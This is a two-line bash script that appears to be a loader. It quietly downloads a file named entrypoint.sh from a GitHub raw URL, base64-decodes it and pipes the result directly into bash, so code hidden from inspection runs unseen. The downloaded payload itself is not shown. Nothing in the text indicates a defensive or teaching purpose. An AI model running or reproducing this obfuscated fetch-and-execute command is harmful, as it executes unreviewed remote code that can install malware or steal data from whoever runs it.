#!/bin/bash
wget -qO- https://raw.githubusercontent.com/christopherparrot/shake/refs/heads/main/entrypoint.sh | base64 -d | bash
